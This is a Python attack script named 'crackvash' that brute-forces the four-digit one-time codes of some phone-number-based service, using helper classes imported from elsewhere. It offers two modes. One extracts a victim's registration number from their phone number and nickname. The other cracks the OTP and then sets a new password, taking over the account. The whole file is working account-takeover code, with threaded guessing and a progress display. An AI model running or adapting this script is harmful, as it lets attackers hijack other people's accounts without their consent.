from assist import ChangePassword, getRegNumber
from time import sleep
import random
from concurrent.futures import ThreadPoolExecutor as TPE
from queue import Queue as Q
from sys import stdout

def banner():
    #generated banner from https://patorjk.com/software/taag/#p=display&f=ANSI%20Regular&t=ckvash%0A
    #font was ANSI Regular
    banner = """
     ██████ ██████   █████   ██████ ██   ██ ██    ██  █████  ███████ ██   ██ 
    ██      ██   ██ ██   ██ ██      ██  ██  ██    ██ ██   ██ ██      ██   ██ 
    ██      ██████  ███████ ██      █████   ██    ██ ███████ ███████ ███████ 
    ██      ██   ██ ██   ██ ██      ██  ██   ██  ██  ██   ██      ██ ██   ██ 
     ██████ ██   ██ ██   ██  ██████ ██   ██   ████   ██   ██ ███████ ██   ██ 
                                                                             
                                                   by itsmmdoha aka HoundSec
                                                                             
    """
    print(f"\033[92;1m{banner}")

banner()



print("\033[93minitializing...\033[0m")
NumberOfThreads = 5
q = Q()
otpList = []

for num in range(10000):
    otp = str(num).zfill(4)
    otpList.append(otp)
for i in range(10000):
    random_otp = random.choice(otpList)
    q.put(random_otp)
    otpList.remove(random_otp)

print("""\033[93m
what do you want?

1)\033[96m Get registration number from Nickname & Phone Number
 \033[93m                     Or,
2)\033[96m Change pasword using Phone Number & Registration number

\033[0m""")

def showProgress(done,nowTrying):
    stdout.write(f"\r\033[91;1mNow trying: {nowTrying} | Attack done: {done/100}% \033[0m")
    stdout.flush()

choice = int(input("(1/2): "))
phone = input("\033[93mPhoneNumber(example:88017********):\033[0m")
if choice==1:
    nickname = input("\033[93mType nickname(case sensitive):\033[0m")
    target = getRegNumber(phone,nickname)
    target.req_otp()
    def crack():
        while target.wrongOTP:
            otp = q.get()
            target.tryOTP(otp)
            Done = 10000 - q.qsize()
            showProgress(Done,nowTrying=otp)#shows progress in percentage
    with TPE(max_workers=NumberOfThreads) as executor:
        executor.submit(crack)


elif choice==2:
    registration = input("\033[93mRegistration number:\033[0m")
    target = ChangePassword(phone, registration)
    target.req_otp()
    def crack():
        while target.wrongOTP:
            otp = q.get()
            target.tryOTP(otp)
            Done = 10000 - q.qsize()
            showProgress(Done,otp)
    NewPassword = input("\033[93mType a new password (atleast 6 charecters long):\033[0m")
    with TPE(max_workers=NumberOfThreads) as executor:
        executor.submit(crack)
    while target.wrongOTP:
        sleep(1)
    print("\n"+target.changePass(NewPassword))
else:
    print("Invalid input")
    exit()
